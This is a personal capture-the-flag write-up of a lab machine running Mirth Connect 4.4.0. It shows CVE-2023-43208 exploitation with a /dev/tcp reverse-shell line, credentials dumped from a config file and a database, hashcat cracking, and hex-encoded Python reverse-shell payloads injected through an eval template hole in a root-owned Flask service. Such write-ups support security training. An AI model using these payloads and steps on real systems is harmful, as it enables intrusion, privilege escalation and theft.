# Interpreter

nmap scan as usual:

```shellscript
┌──(jagerr㉿kali)-[~]
└─$ nmap -sC -sV 10.129.4.254
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-23 12:13 +0100
Nmap scan report for 10.129.4.254
Host is up (0.012s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 07:eb:d1:b1:61:9a:6f:38:08:e0:1e:3e:5b:61:03:b9 (ECDSA)
|_  256 fc:d5:7a:ca:8c:4f:c1:bd:c7:2f:3a:ef:e1:5e:99:0f (ED25519)
80/tcp  open  http     Jetty
|_http-title: Mirth Connect Administrator
| http-methods: 
|_  Potentially risky methods: TRACE
443/tcp open  ssl/http Jetty
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mirth-connect
| Not valid before: 2025-09-19T12:50:05
|_Not valid after:  2075-09-19T12:50:05
|_http-title: Mirth Connect Administrator
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.52 seconds
```

taking a look at the webpage:

<figure><img src="../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

It seems we can download and launch some panels. Also we can access a secure site which leads to a login page:

<figure><img src="../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

I tried the basic admin:admin but no luck, i started googling around for some exploits since i had no clue where also to look and i found a recent post about checking the version you're running: [https://www.huntress.com/threat-library/vulnerabilities/cve-2023-43208](https://www.huntress.com/threat-library/vulnerabilities/cve-2023-43208). Testing it myself i got:

```shellscript
┌──(jagerr㉿kali)-[~]
└─$ curl -k -H 'X-Requested-With: OpenAPI' https://10.129.4.254/api/server/version
4.4.0  
```

So lets try out the PoC: [https://github.com/K3ysTr0K3R/CVE-2023-43208-EXPLOIT](https://github.com/K3ysTr0K3R/CVE-2023-43208-EXPLOIT)

```shellscript
┌──(.venv)─(jagerr㉿kali)-[~/Downloads/cve]
└─$ python3 exploit.py -u=https://10.129.4.254 -lh=10.10.14.117 -lp=12345 -t=5 

 ██████ ██    ██ ███████       ██████   ██████  ██████  ██████        ██   ██ ██████  ██████   ██████   █████                                                                                                           
██      ██    ██ ██                 ██ ██  ████      ██      ██       ██   ██      ██      ██ ██  ████ ██   ██                                                                                                          
██      ██    ██ █████   █████  █████  ██ ██ ██  █████   █████  █████ ███████  █████   █████  ██ ██ ██  █████                                                                                                           
██       ██  ██  ██            ██      ████  ██ ██           ██            ██      ██ ██      ████  ██ ██   ██                                                                                                          
 ██████   ████   ███████       ███████  ██████  ███████ ██████             ██ ██████  ███████  ██████   █████                                                                                                           

[+] Coded By: K3ysTr0K3R and Chocapikk ( NSA, we're still waiting :D )

[*] Setting up listener on 10.10.14.117:12345 and launching exploit...
[*] Waiting for incoming connection on port 12345...
[*] Looking for Mirth Connect instance...
[+] Found Mirth Connect instance
[+] Vulnerable Mirth Connect version 4.4.0 instance found at https://10.129.4.254
[!] sh -c $@|sh . echo bash -c '0<&53-;exec 53<>/dev/tcp/10.10.14.117/12345;sh <&53 >&53 2>&53'
[*] Launching exploit against https://10.129.4.254...
[+] Received connection from 10.129.4.254:48664
[+] Interactive shell established. Type 'exit' to quit.
id
uid=103(mirth) gid=111(mirth) groups=111(mirth)
```

we got a shell. lets stebalize and check the contents:

```shellscript
python3 -c 'import pty; pty.spawn("/bin/bash")'
mirth@interpreter:/usr/local/mirthconnect$ ls
ls
client-lib  logs                 mirth-server-launcher.jar  server-lib
conf        mcserver             preferences                uninstall
custom-lib  mcserver.vmoptions   public_api_html            webapps
docs        mcservice            public_html
extensions  mcservice.vmoptions  server-launcher-lib
```

&#x20;when i check conf/mirth.properties, i find database credentials.

<pre class="language-shellscript"><code class="lang-shellscript">cat conf/mirth.properties
# Mirth Connect configuration file

# directories
dir.appdata = /var/lib/mirthconnect
dir.tempdata = ${dir.appdata}/temp

# ports
http.port = 80
https.port = 443

# password requirements
password.minlength = 0
password.minupper = 0
password.minlower = 0
password.minnumeric = 0
password.minspecial = 0
password.retrylimit = 0
password.lockoutperiod = 0
password.expiration = 0
password.graceperiod = 0
password.reuseperiod = 0
password.reuselimit = 0

# Only used for migration purposes, do not modify
version = 4.4.0

<strong># keystore
</strong>keystore.path = ${dir.appdata}/keystore.jks
keystore.storepass = 5GbU5HGTOOgE
keystore.keypass = tAuJfQeXdnPw
keystore.type = JCEKS

# server
http.contextpath = /
server.url =

http.host = 0.0.0.0
https.host = 0.0.0.0

https.client.protocols = TLSv1.3,TLSv1.2
https.server.protocols = TLSv1.3,TLSv1.2,SSLv2Hello
https.ciphersuites = TLS_CHACHA20_POLY1305_SHA256,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,TLS_DHE_RSA_WITH_CHACHA20_POLY1305_SHA256,TLS_AES_256_GCM_SHA384,TLS_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDH_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDH_RSA_WITH_AES_256_GCM_SHA384,TLS_DHE_RSA_WITH_AES_256_GCM_SHA384,TLS_DHE_DSS_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDH_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDH_RSA_WITH_AES_128_GCM_SHA256,TLS_DHE_RSA_WITH_AES_128_GCM_SHA256,TLS_DHE_DSS_WITH_AES_128_GCM_SHA256,TLS_EMPTY_RENEGOTIATION_INFO_SCSV
https.ephemeraldhkeysize = 2048

# If set to true, the Connect REST API will require all incoming requests to contain an "X-Requested-With" header.
# This protects against Cross-Site Request Forgery (CSRF) security vulnerabilities.
server.api.require-requested-with = true

# CORS headers
server.api.accesscontrolalloworigin = *
server.api.accesscontrolallowcredentials = false
server.api.accesscontrolallowmethods = GET, POST, DELETE, PUT
server.api.accesscontrolallowheaders = Content-Type
server.api.accesscontrolexposeheaders =
server.api.accesscontrolmaxage =

# Determines whether or not channels are deployed on server startup.
server.startupdeploy = true

# Determines whether libraries in the custom-lib directory will be included on the server classpath.
# To reduce potential classpath conflicts you should create Resources and use them on specific channels/connectors instead, and then set this value to false.
server.includecustomlib = true

# administrator
administrator.maxheapsize = 512m

# properties file that will store the configuration map and be loaded during server startup
configurationmap.path = ${dir.appdata}/configuration.properties

# The language version for the Rhino JavaScript engine (supported values: 1.0, 1.1, ..., 1.8, es6).
rhino.languageversion = es6

# options: derby, mysql, postgres, oracle, sqlserver
database = mysql

# examples:
#   Derby                       jdbc:derby:${dir.appdata}/mirthdb;create=true
#   PostgreSQL                  jdbc:postgresql://localhost:5432/mirthdb
#   MySQL                       jdbc:mysql://localhost:3306/mirthdb
#   Oracle                      jdbc:oracle:thin:@localhost:1521:DB
#   SQL Server/Sybase (jTDS)    jdbc:jtds:sqlserver://localhost:1433/mirthdb
#   Microsoft SQL Server        jdbc:sqlserver://localhost:1433;databaseName=mirthdb
#   If you are using the Microsoft SQL Server driver, please also specify database.driver below 
database.url = jdbc:mariadb://localhost:3306/mc_bdd_prod

# If using a custom or non-default driver, specify it here.
# example:
# Microsoft SQL server: database.driver = com.microsoft.sqlserver.jdbc.SQLServerDriver
# (Note: the jTDS driver is used by default for sqlserver)
database.driver = org.mariadb.jdbc.Driver

# Maximum number of connections allowed for the main read/write connection pool
database.max-connections = 20
# Maximum number of connections allowed for the read-only connection pool
database-readonly.max-connections = 20

# database credentials
database.username = mirthdb
database.password = MirthPass123!

#On startup, Maximum number of retries to establish database connections in case of failure
database.connection.maxretry = 2

#On startup, Maximum wait time in milliseconds for retry to establish database connections in case of failure
database.connection.retrywaitinmilliseconds = 10000

# If true, various read-only statements are separated into their own connection pool.
# By default the read-only pool will use the same connection information as the master pool,
# but you can change this with the "database-readonly" options. For example, to point the
# read-only pool to a different JDBC URL:
#
# database-readonly.url = jdbc:...
# 
database.enable-read-write-split = true

</code></pre>

Lets connect!

```shellscript
mirth@interpreter:/usr/local/mirthconnect$ mariadb -u mirthdb -pMirthPass123!
mariadb -u mirthdb -pMirthPass123!
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 46
Server version: 10.11.14-MariaDB-0+deb12u2 Debian 12

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mc_bdd_prod        |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [(none)]> use mc_bdd_prod;
use mc_bdd_prod;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [mc_bdd_prod]> show tables;
show tables;
+-----------------------+
| Tables_in_mc_bdd_prod |
+-----------------------+
| ALERT                 |
| CHANNEL               |
| CHANNEL_GROUP         |
| CODE_TEMPLATE         |
| CODE_TEMPLATE_LIBRARY |
| CONFIGURATION         |
| DEBUGGER_USAGE        |
| D_CHANNELS            |
| D_M1                  |
| D_MA1                 |
| D_MC1                 |
| D_MCM1                |
| D_MM1                 |
| D_MS1                 |
| D_MSQ1                |
| EVENT                 |
| PERSON                |
| PERSON_PASSWORD       |
| PERSON_PREFERENCE     |
| SCHEMA_INFO           |
| SCRIPT                |
+-----------------------+
21 rows in set (0.001 sec)

MariaDB [mc_bdd_prod]> 
```

Nice, lets check out PERSON and PERSON\_PASSWORD

```sql
MariaDB [mc_bdd_prod]> select * from PERSON;
select * from PERSON;                                                                                       
+----+----------+-----------+----------+--------------+----------+-------+-------------+-------------+---------------------+--------------------+--------------+------------------+-----------+------+---------------+----------------+-------------+                                                                               
| ID | USERNAME | FIRSTNAME | LASTNAME | ORGANIZATION | INDUSTRY | EMAIL | PHONENUMBER | DESCRIPTION | LAST_LOGIN          | GRACE_PERIOD_START | STRIKE_COUNT | LAST_STRIKE_TIME | LOGGED_IN | ROLE | COUNTRY       | STATETERRITORY | USERCONSENT |                                                                               
+----+----------+-----------+----------+--------------+----------+-------+-------------+-------------+---------------------+--------------------+--------------+------------------+-----------+------+---------------+----------------+-------------+                                                                               
|  2 | sedric   |           |          |              | NULL     |       |             |             | 2025-09-21 17:56:02 | NULL               |            0 | NULL             |           | NULL | United States | NULL           |           0 |                                                                               
+----+----------+-----------+----------+--------------+----------+-------+-------------+-------------+---------------------+--------------------+--------------+------------------+-----------+------+---------------+----------------+-------------+
1 row in set (0.000 sec)

MariaDB [mc_bdd_prod]> select * from PERSON_PASSWORD;
select * from PERSON_PASSWORD;
+-----------+----------------------------------------------------------+---------------------+
| PERSON_ID | PASSWORD                                                 | PASSWORD_DATE       |
+-----------+----------------------------------------------------------+---------------------+
|         2 | u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w== | 2025-09-19 09:22:28 |
+-----------+----------------------------------------------------------+---------------------+
1 row in set (0.000 sec)
```

after A LOT of googling and chatgpting i found out how to format the hash finally and to decode.

```shellscript
sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=
```

run hashcat

```shellscript
$ hashcat -m 10900 -a 0 hash.txt rockyou.txt --potfile-disable
hashcat (v7.1.2) starting

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 100c

Host memory allocated for this attack: 1037 MB (8333 MB free)

Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

Cracking performance lower than expected?

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=:snowflake1

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
Hash.Target......: sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD...Ld8Ps=
Time.Started.....: Tue Feb 24 10:43:18 2026 (4 mins, 47 secs)
Time.Estimated...: Tue Feb 24 10:48:05 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#02........:      572 H/s (11.35ms) @ Accel:64 Loops:1000 Thr:256 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 163840/14344384 (1.14%)
Rejected.........: 0/163840 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#02..: Salt:0 Amplifier:0-1 Iteration:599000-599999
Candidate.Engine.: Device Generator
Candidates.#02...: 123456 -> 24782478
Hardware.Mon.SMC.: Fan0: 76%
Hardware.Mon.#02.: Util: 99% Pwr:6257mW

Started: Tue Feb 24 10:43:09 2026
Stopped: Tue Feb 24 10:48:07 2026
```

We got the password `snowflake1`. Login and get the flag:

```shellscript
┌──(jagerr㉿kali)-[~]
└─$ ssh sedric@10.129.5.163
sedric@10.129.5.163's password: 
Permission denied, please try again.
sedric@10.129.5.163's password: 
Linux interpreter 6.1.0-43-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.162-1 (2026-02-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Feb 23 14:01:31 2026 from 10.10.14.117
sedric@interpreter:~$ cat /home/sedric/user.txt 
a3ff728155973095f89f46fbbd1fb34d
```

After some looking around i decided to use the checklist [https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html](https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html). I tried linpeas, but there was too much information i couldnt see anything interesting. Checking the path i saw /usr/local/bin, usually not that interesting but i decided to look anyway. here i found a notif.py script.

```shellscript
sedric@interpreter:/usr/local/bin$ cat notif.py 
#!/usr/bin/env python3
"""
Notification server for added patients.
This server listens for XML messages containing patient information and writes formatted notifications to files in /var/secure-health/patients/.
It is designed to be run locally and only accepts requests with preformated data from MirthConnect running on the same machine.
It takes data interpreted from HL7 to XML by MirthConnect and formats it using a safe templating function.
"""
from flask import Flask, request, abort
import re
import uuid
from datetime import datetime
import xml.etree.ElementTree as ET, os

app = Flask(__name__)
USER_DIR = "/var/secure-health/patients/"; os.makedirs(USER_DIR, exist_ok=True)

def template(first, last, sender, ts, dob, gender):
    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
    for s in [first, last, sender, ts, dob, gender]:
        if not pattern.fullmatch(s):
            return "[INVALID_INPUT]"
    # DOB format is DD/MM/YYYY
    try:
        year_of_birth = int(dob.split('/')[-1])
        if year_of_birth < 1900 or year_of_birth > datetime.now().year:
            return "[INVALID_DOB]"
    except:
        return "[INVALID_DOB]"
    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
    try:
        return eval(f"f'''{template}'''")
    except Exception as e:
        return f"[EVAL_ERROR] {e}"

@app.route("/addPatient", methods=["POST"])
def receive():
    if request.remote_addr != "127.0.0.1":
        abort(403)
    try:
        xml_text = request.data.decode()
        xml_root = ET.fromstring(xml_text)
    except ET.ParseError:
        return "XML ERROR\n", 400
    patient = xml_root if xml_root.tag=="patient" else xml_root.find("patient")
    if patient is None:
        return "No <patient> tag found\n", 400
    id = uuid.uuid4().hex
    data = {tag: (patient.findtext(tag) or "") for tag in ["firstname","lastname","sender_app","timestamp","birth_date","gender"]}
    notification = template(data["firstname"],data["lastname"],data["sender_app"],data["timestamp"],data["birth_date"],data["gender"])
    path = os.path.join(USER_DIR,f"{id}.txt")
    with open(path,"w") as f:
        f.write(notification+"\n")
    return notification

if __name__=="__main__":
    app.run("127.0.0.1",54321, threaded=True)

```

reading the descrition of the script, it made me realize that i hadnt tried logging into the webpage with sedrics credentials yet. So i tried, and i got in. i did not see anything intersting, only the launch administrator button.

<figure><img src="../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

Clickign this would download a webstart.jnlp file. I spent a lot of time trying to run this, but in the end i realized there was an install script on the home screen of the website. using this script i had to solve more errors since im on linux arm64, but after a couple tears i ended up getting a new screen

```shellscript
LD_LIBRARY_PATH=/usr/lib/aarch64-linux-gnu/jni:$LD_LIBRARY_PATH \
/opt/mirth-administrator-launcher/launcher 2>&1 | tee /tmp/mirth-launcher.log
```

<figure><img src="../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

when i used http://mirth-connect:80 i got a login screen.&#x20;

<figure><img src="../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

Here i logged in with sedrics credentials and when i authenticated i finally got a new screen:

<figure><img src="../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

I fill in the dialog and continue. From the script we know we need to send a message and then it will do some magic so lets try:

<figure><img src="../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

```
\&|MirthConnect|HOSP|NotifyApp|Local|20260225103000||ADT^A04|MSG00001|P|2.5
EVN|A04|20260225103000
PID|1||12345^^^HOSP^MR||{eval(bytes.fromhex("5f5f696d706f72745f5f28226f7322292e73797374656d28226370202f62696e2f62617368202f746d702f626173683b63686d6f64202b73202f746d702f626173682229").decode())}||19800115|M
PV1|1|O
```

i tried sending a message thru the gui, but i could not get any response anywhere. so i tried using the api:

```shellscript
sedric@interpreter:~$ cat > /tmp/patient.xml <<'EOF'                                       
<patient>
  <firstname>{exec(bytes.fromhex("696d706f727420736f636b65742c6f732c7074790a733d736f636b65742e736f636b657428736f636b65742e41465f494e45542c736f636b65742e534f434b5f53545245414d290a732e636f6e6e65637428282231302e31302e31342e313137222c3132333429290a6f732e6475703228732e66696c656e6f28292c30290a6f732e6475703228732e66696c656e6f28292c31290a6f732e6475703228732e66696c656e6f28292c32290a7074792e737061776e28222f62696e2f626173682229").decode())}</firstname>
  <lastname>Doe</lastname>
  <sender_app>MirthConnect</sender_app>
  <timestamp>20260225T114400</timestamp>
  <birth_date>14/07/1988</birth_date>
  <gender>M</gender>
</patient>
EOF
sedric@interpreter:~$ cd /tmp
sedric@interpreter:/tmp$ wget -qO- \
  --header='Content-Type: application/xml' \
  --post-file=/tmp/patient.xml \
  http://127.0.0.1:54321/addPatient
Patient John Doe (M), 38 years old, received from MirthConnect at 20260225T114400sedric@interpreter:/tmp$                 
```

here we see it is indeed executing my test code. we can finally do something. lets do a test for template injection:

```
sedric@interpreter:/tmp$ cat > /tmp/patient.xml <<'EOF'                                       
<patient>
  <firstname>{1+1}</firstname>
  <lastname>Doe</lastname>
  <sender_app>MirthConnect</sender_app>
  <timestamp>20260225T114400</timestamp>
  <birth_date>14/07/1988</birth_date>
  <gender>M</gender>
</patient>
EOF
sedric@interpreter:/tmp$ wget -qO-   --header='Content-Type: application/xml'   --post-file=/tmp/patient.xml   http://127.0.0.1:54321/addPatient
Patient 2 Doe (M), 38 years old, received from MirthConnect at 20260225T114400sedric@interpreter:/tmp$ 

```

it works, we can probably try to get a shell with this:

```
┌──(jagerr㉿kali)-[~/Downloads]
└─$ python3                                                                   
Python 3.13.9 (main, Oct 15 2025, 14:56:22) [GCC 15.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> rev_shell_code = f"""
... import socket,os,pty
... s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
... s.connect(("10.10.14.117",1234))
... os.dup2(s.fileno(),0)
... os.dup2(s.fileno(),1)
... os.dup2(s.fileno(),2)
... pty.spawn("/bin/bash")
... """.strip()
>>> rev_shell_code.encode().hex()
'696d706f727420736f636b65742c6f732c7074790a733d736f636b65742e736f636b657428736f636b65742e41465f494e45542c736f636b65742e534f434b5f53545245414d290a732e636f6e6e65637428282231302e31302e31342e313137222c3132333429290a6f732e6475703228732e66696c656e6f28292c30290a6f732e6475703228732e66696c656e6f28292c31290a6f732e6475703228732e66696c656e6f28292c32290a7074792e737061776e28222f62696e2f626173682229'
>>> 

```

add the encoded string to the payload:

```
sedric@interpreter:/tmp$ cat > /tmp/patient.xml <<'EOF'                                       
<patient>
  <firstname>{exec(bytes.fromhex("696d706f727420736f636b65742c6f732c7074790a733d736f636b65742e736f636b657428736f636b65742e41465f494e45542c736f636b65742e534f434b5f53545245414d290a732e636f6e6e65637428282231302e31302e31342e313137222c3132333429290a6f732e6475703228732e66696c656e6f28292c30290a6f732e6475703228732e66696c656e6f28292c31290a6f732e6475703228732e66696c656e6f28292c32290a7074792e737061776e28222f62696e2f626173682229").decode())}</firstname>
  <lastname>Doe</lastname>
  <sender_app>MirthConnect</sender_app>
EOFatient>M</gender>1988</birth_date>mp>
```

and execute:

```
sedric@interpreter:/tmp$ wget -qO- \
  --header='Content-Type: application/xml' \
  --post-file=/tmp/patient.xml \
  http://127.0.0.1:54321/addPatient
```

we get the shell. get the flag.

```
──(jagerr㉿kali)-[~/Downloads]
└─$ nc -lvnp 1234                   
listening on [any] 1234 ...
connect to [10.10.14.117] from (UNKNOWN) [10.129.6.244] 40168
root@interpreter:/usr/local/bin# cat /root/root.txt
cat /root/root.txt
88b171147a195e970f693761e32566e8
root@interpreter:/usr/local/bin# 

```

my fricking god. that took so long. my god.

flag: 88b171147a195e970f693761e32566e8
